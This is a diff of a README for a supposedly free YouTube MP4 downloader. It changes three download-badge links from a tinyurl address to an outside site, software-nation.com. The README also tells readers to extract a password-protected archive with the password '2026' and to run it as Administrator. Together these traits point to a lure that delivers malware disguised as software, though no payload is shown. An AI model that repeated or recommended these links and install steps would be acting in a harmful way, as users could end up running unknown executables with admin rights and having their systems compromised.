@@ -9,7 +9,7 @@ The **📹 YouTube MP4 Download** is a **free** video downloader that lets you s
 
 <div align="center">
 
-[![Download YouTube MP4 Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/youtube-mp4-download)
+[![Download YouTube MP4 Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/youtube-mp4-download)
 
 </div>
 
@@ -109,7 +109,7 @@ YouTube requires internet connection for streaming. This educational tool helps 
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Paste YouTube link → Download
 
-[![Download YouTube MP4 Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/youtube-mp4-download)
+[![Download YouTube MP4 Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/youtube-mp4-download)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -262,7 +262,7 @@ Download any YouTube video as MP4 for free. **YouTube MP4 Download** lets you sa
 
 <div align="center">
 
-[![Download YouTube MP4 Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/youtube-mp4-download)
+[![Download YouTube MP4 Download](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/youtube-mp4-download)
 
 **Version 4.6.1** — Free video downloader. April 2026 update. Zero cost. No payment.
 
